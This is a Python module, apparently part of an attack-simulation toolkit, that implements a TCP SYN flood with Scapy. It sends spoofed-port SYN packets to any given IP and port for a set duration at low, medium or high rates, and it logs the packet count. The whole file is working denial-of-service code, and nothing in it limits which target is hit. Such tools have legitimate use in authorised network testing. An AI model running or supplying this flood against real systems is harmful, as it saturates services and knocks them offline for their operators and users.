"""SYN Flood — TCP SYN packet flood using Scapy."""
from modules.attacks.base import BaseAttack, AttackResult, logger
import time


class SynFloodAttack(BaseAttack):
    name = "syn_flood"
    description = "TCP SYN flood attack — saturates target with half-open connections"
    mitre_ref = "T1498.001"

    def run(self, target_ip: str, duration_s: int = 30, intensity: str = "medium",
            target_port: int = 80, **kwargs) -> AttackResult:
        if not self.validate(target_ip):
            return AttackResult(success=False, error=f"Invalid IP: {target_ip}")
        rate = {"low": 50, "medium": 200, "high": 1000}.get(intensity, 200)
        try:
            from scapy.all import IP, TCP, send, RandShort
            pkt = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
            start = time.time()
            count = 0
            while time.time() - start < duration_s:
                send(pkt, count=rate, inter=0.01, verbose=False)
                count += rate
            elapsed = time.time() - start
            logger.info("SYN flood: %d packets in %.1fs → %s:%d", count, elapsed, target_ip, target_port)
            return AttackResult(success=True, packets=count, duration=elapsed)
        except ImportError:
            return AttackResult(success=False, error="scapy required: pip install scapy")
        except Exception as e:
            return AttackResult(success=False, error=str(e))
